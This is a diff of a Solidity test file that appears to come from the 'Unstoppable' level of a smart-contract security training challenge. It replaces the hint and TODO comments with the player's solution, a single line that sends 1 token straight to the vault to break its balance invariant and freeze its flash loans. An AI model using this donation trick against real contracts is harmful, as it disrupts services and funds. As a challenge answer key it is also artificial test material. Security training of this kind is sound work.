@@ -91,11 +91,8 @@ contract UnstoppableChallenge is Test {
     // Write your attack here — this is the only function you need to change
     ////////////////////////////////////////////////////////////////////////
     function test_unstoppable() public checkSolvedByPlayer {
-        // Hint: you are holding 10 DVT. What assumption does the vault make about its own balance?
-        //
-        // TODO: your code goes here
+    token.transfer(address(vault), 1);
     }
-
     ////////////////////////////////////////////////////////////////////////
     // Pass/fail check — do not change
     ////////////////////////////////////////////////////////////////////////
